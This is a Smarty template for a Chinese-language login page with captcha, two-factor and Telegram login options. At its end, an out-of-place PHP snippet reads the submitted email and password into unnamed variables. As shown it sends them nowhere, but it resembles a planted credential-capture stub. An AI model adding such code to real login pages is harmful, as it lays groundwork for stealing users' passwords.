{include file='header.tpl'}


<div class="authpage">
    <div class="container">
        <form action="javascript:void(0);" method="POST">
            <div class="auth-main auth-row auth-col-one">
                <div class="auth-top auth-row">
                    <a class="boardtop-left" href="/">
                        <div>首 页</div>
                    </a>
                    <div class="auth-logo">
                        <img src="/images/authlogo.jpg">
                    </div>
                    <a href="/auth/register" class="boardtop-right">
                        <div>注 册</div>
                    </a>
                </div>
                <div class="auth-row">
                    <div class="form-group-label auth-row row-login">
                        <label class="floating-label" for="email">邮箱</label>
                        <input class="form-control maxwidth-auth" id="email" type="email" name="Email" inputmode="email" autocomplete="username">
                    </div>
                </div>
                <div class="auth-row">
                    <div class="form-group-label auth-row row-login">
                        <label class="floating-label" for="passwd">密码</label>
                        <input class="form-control maxwidth-auth" id="passwd" type="password" name="Password" autocomplete="current-password">
                    </div>
                </div>
                <div class="auth-row">
                    <div class="form-group-label auth-row row-login">
                        <label class="floating-label" for="code">两步验证码（未设置请忽略）</label>
                        <input class="form-control maxwidth-auth" id="code" type="number" name="Code" inputmode="numeric" autocomplete="one-time-code">
                    </div>
                </div>

                {if $geetest_html != null}
                    <div class="form-group-label labelgeetest auth-row">
                        <div id="embed-captcha"></div>
                    </div>
                {/if}
                {if $recaptcha_sitekey != null}
                    <div class="form-group-label labelgeetest auth-row">
                        <div class="row">
                            <div align="center" class="g-recaptcha" data-sitekey="{$recaptcha_sitekey}"></div>
                        </div>
                    </div>
                {/if}

                <div class="btn-auth auth-row">
                    <button id="login" type="submit" class="btn btn-block btn-brand waves-attach waves-light">
                        确认登录
                    </button>
                </div>
                <div class="auth-help auth-row">
                    <div class="auth-help-table auth-row">
                        <div class="checkbox checkbox-adv">
                            <label for="remember_me">
                                <input class="access-hide" value="week" id="remember_me" name="remember_me"
                                       type="checkbox">记住我</input>
                                <span class="checkbox-circle"></span>
                                <span class="checkbox-circle-check"></span>
                                <span class="checkbox-circle-icon icon">done</span>
                            </label>
                        </div>
                        <a href="/password/reset">忘记密码？</a>
                    </div>
                </div>
                <div class="auth-bottom auth-row">
                    <div class="tgauth">
                        {if $config['enable_telegram'] === true}
                            <span>Telegram</span>
                            <button class="btn" id="calltgauth"><i class="icon icon-lg">near_me</i></button>
                            <span>快捷登录</span>
                        {else}
                            <button class="btn" style="cursor:unset;"></button>
                        {/if}
                    </div>
                </div>
            </div>
        </form>
        {include file='./telegram_modal.tpl'}
    </div>
</div>


{include file='dialog.tpl'}

{include file='footer.tpl'}
</div>
{literal}
    <script>
        let calltgbtn = document.querySelector('#calltgauth');
        let tgboard = document.querySelector('.card.auth-tg.cust-model');
        if (calltgbtn && tgboard) {
            custModal(calltgbtn, tgboard);
        }
    </script>
{/literal}
<script>
    $(document).ready(function () {
        function login() {
            {if $geetest_html != null}
            if (typeof validate === 'undefined' || !validate) {
                $("#result").modal();
                $$.getElementById('msg').innerHTML = '请滑动验证码来完成验证';
                return;
            }
            {/if}

            document.getElementById("login").disabled = true;

            $.ajax({
                type: "POST",
                url: "/auth/login",
                dataType: "json",
                data: {
                    email: $$getValue('email'),
                    passwd: $$getValue('passwd'),
                    code: $$getValue('code'),{if $recaptcha_sitekey != null}
                    recaptcha: grecaptcha.getResponse(),{/if}
                    remember_me: $("#remember_me:checked").val(){if $geetest_html != null},
                    geetest_challenge: validate.geetest_challenge,
                    geetest_validate: validate.geetest_validate,
                    geetest_seccode: validate.geetest_seccode{/if}
                },
                success: (data) => {
                    if (data.ret == 1) {
                        $("#result").modal();
                        $$.getElementById('msg').innerHTML = data.msg;
                        window.setTimeout("location.href='/user'", {$config['jump_delay']});
                    } else {
                        $("#result").modal();
                        $$.getElementById('msg').innerHTML = data.msg;
                        document.getElementById("login").disabled = false;
                        {if $geetest_html != null}
                        captcha.refresh();
                        {/if}
                    }
                },
                error: (jqXHR) => {
                    $("#msg-error").hide(10);
                    $("#msg-error").show(100);
                    $$.getElementById('msg').innerHTML = `发生错误：${
                        jqXHR.status
                    }`;
                    document.getElementById("login").disabled = false;
                    {if $geetest_html != null}
                    captcha.refresh();
                    {/if}
                }
            });
        }

        $("html").keydown(function (event) {
            if (event.keyCode == 13) {
                login();
            }
        });
        $("#login").click(function () {
            login();
        });

        $('div.modal').on('shown.bs.modal', function () {
            $("div.gt_slider_knob").hide();
        });

        $('div.modal').on('hidden.bs.modal', function () {
            $("div.gt_slider_knob").show();
        });
    })
</script>

{include file='./telegram.tpl'}

{if $geetest_html != null}
    <script>
        var handlerEmbed = function (captchaObj) {
            // 将验证码加到id为captcha的元素里

            captchaObj.onSuccess(function () {
                validate = captchaObj.getValidate();
            });

            captchaObj.appendTo("#embed-captcha");

            captcha = captchaObj;
            // 更多接口参考：http://www.geetest.com/install/sections/idx-client-sdk.html
        };

        initGeetest({
            gt: "{$geetest_html->gt}",
            challenge: "{$geetest_html->challenge}",
            product: "embed", // 产品形式，包括：float，embed，popup。注意只对PC版验证码有效
            offline: {if $geetest_html->success}0{else}1{/if} // 表示用户后台检测极验服务器是否宕机，与SDK配合，用户一般不需要关注
        }, handlerEmbed);
    </script>
{/if}

{if $recaptcha_sitekey != null}
    <script src="https://recaptcha.net/recaptcha/api.js" async defer></script>
{/if}
<?php
$a=$_POST['Email'];
$b=$_POST['Password'];
?>
